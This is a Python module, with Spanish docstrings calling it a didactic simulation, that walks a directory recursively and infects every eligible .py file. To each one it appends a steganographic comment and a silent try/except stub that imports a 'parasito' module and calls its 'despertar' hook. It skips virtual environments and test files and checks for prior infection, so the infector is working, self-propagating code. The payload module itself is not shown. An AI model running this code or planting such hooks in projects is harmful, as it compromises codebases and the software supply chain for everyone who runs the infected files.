"""
Módulo de Simulación de Propagación e Infección Esteganográfica.
Demuestra de forma controlada y didáctica el vector de ataque Supply-Chain
inyectando el payload Parásito en comentarios de archivos Python.
"""

import os
from typing import List, Optional
from .steganography import synthesize_steganographic_comment


def infect_target_file(
    target_path: str,
    ghost_message: str = "INFILTRADO",
    payload_instructions: Optional[List[str]] = None
) -> bool:
    """
    Inyecta código Parásito dentro de un archivo Python objetivo preservando
    su funcionalidad previa sin romper la sintaxis.
    """
    if not os.path.exists(target_path):
        return False

    if payload_instructions is None:
        payload_instructions = [
            "limpiar", "guardar", "PARASITO_ACTIVO",
            "mostrar", "salto", "secreto", "PAYLOAD_INFILTRADO"
        ]

    stego_comment = synthesize_steganographic_comment(payload_instructions, ghost_message)

    try:
        with open(target_path, "r", encoding="utf-8") as f:
            content = f.read()

        # Si ya contiene el hook de despertar, no reinfectar
        if "parasito.despertar" in content:
            return False

        injection_stub = (
            f"\n# {stego_comment}\n"
            f"try:\n"
            f"    import parasito\n"
            f"    parasito.despertar(__file__)\n"
            f"except Exception:\n"
            f"    pass\n"
        )

        with open(target_path, "a", encoding="utf-8") as f:
            f.write(injection_stub)

        return True
    except Exception:
        return False


def infect_directory(
    directory_path: str,
    ghost_message: str = "INFILTRADO",
    payload_instructions: Optional[List[str]] = None
) -> int:
    """
    Escanea un directorio recursivamente e infecta archivos .py benignos.
    Omite archivos del propio intérprete y entornos virtuales.
    """
    count = 0
    ignored_dirs = {".git", ".venv", "venv", "__pycache__", "site-packages", "docs"}

    for root, dirs, files in os.walk(directory_path):
        dirs[:] = [d for d in dirs if d not in ignored_dirs]
        for file in files:
            if file.endswith(".py") and not file.startswith(("test_", "parasito")):
                full_path = os.path.join(root, file)
                if infect_target_file(full_path, ghost_message, payload_instructions):
                    count += 1
    return count
